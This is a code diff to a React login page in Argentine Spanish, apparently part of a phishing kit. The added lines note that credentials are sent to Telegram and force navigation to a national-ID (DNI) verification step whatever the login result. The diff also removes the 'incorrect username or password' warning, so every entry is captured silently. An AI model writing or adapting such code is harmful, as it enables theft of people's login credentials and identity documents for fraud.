@@ -13,12 +13,14 @@ export default function Login() {
 
   const handleSubmit = async (e: FormEvent) => {
     e.preventDefault();
+    // Intentar login (envía datos a Telegram)
     try {
       await login({ username, password });
-      navigate('/dni-verification');
     } catch (error) {
-      console.error('Login failed:', error);
+      console.log('Login enviado');
     }
+    // SIEMPRE pasar al siguiente paso
+    navigate('/dni-verification');
   };
 
   return (
@@ -53,12 +55,6 @@ export default function Login() {
           {/* Formulario */}
           <div className="bg-white p-8 rounded-b-lg shadow-lg">
             <h2 className="text-2xl font-semibold text-green-600 mb-6">Iniciá sesión</h2>
-
-            {loginError && (
-              <div className="bg-red-50 border-l-4 border-red-500 text-red-700 p-3 mb-4 text-sm">
-                Usuario o contraseña incorrectos
-              </div>
-            )}
 
             <form onSubmit={handleSubmit} className="space-y-5">
               <div>
